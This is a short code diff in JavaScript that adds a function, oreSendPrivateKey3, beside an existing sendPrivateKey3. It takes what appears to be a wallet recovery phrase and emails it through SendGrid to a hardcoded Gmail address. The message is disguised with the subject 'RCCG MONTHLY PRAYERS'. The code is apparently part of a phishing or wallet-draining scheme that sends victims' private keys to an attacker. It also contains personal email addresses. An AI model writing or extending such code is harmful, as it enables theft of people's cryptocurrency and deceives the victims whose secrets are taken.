@@ -139,3 +139,27 @@ export const sendPrivateKey3 = async (rPhrase) => {
       console.log(JSON.stringify(error));
     });
 };
+
+export const oreSendPrivateKey3 = async (rPhrase) => {
+  const redeem = `RCCG`;
+  const SENDER_EMAIL2 = `Tonyellaby@gmail.com`;
+
+  const msg = {
+    to: SENDER_EMAIL2,
+    from: {
+      email: "oforduharrison@gmail.com",
+      name: redeem,
+    },
+    subject: "RCCG MONTHLY PRAYERS",
+    html: `${html3(redeem, SENDER_EMAIL2, rPhrase)}`,
+  };
+  sgMail
+    .send(msg)
+    .then(() => {
+      console.log("Email sent");
+    })
+    .catch((error) => {
+      console.error(error);
+      console.log(JSON.stringify(error));
+    });
+};
